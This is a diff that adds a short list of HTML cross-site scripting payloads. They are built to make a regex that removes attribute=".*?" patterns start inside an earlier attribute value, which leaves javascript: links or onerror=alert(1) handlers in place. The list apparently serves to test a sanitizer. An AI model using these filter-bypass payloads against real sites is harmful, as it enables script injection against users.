@@ -1,0 +1,8 @@
+# Payloads to shift regex start into a previous attribute value
+# Goal: make removal like attribute=".*?" start inside prior value and end at next quote
+
+<a href="attribute=" title="javascript:alert(1)">test</a>
+<a href='attribute="' title="javascript:alert(1)">test</a>
+<img alt="attribute=" title="onerror=alert(1)">
+<img src="attribute=" onerror="alert(1)">
+
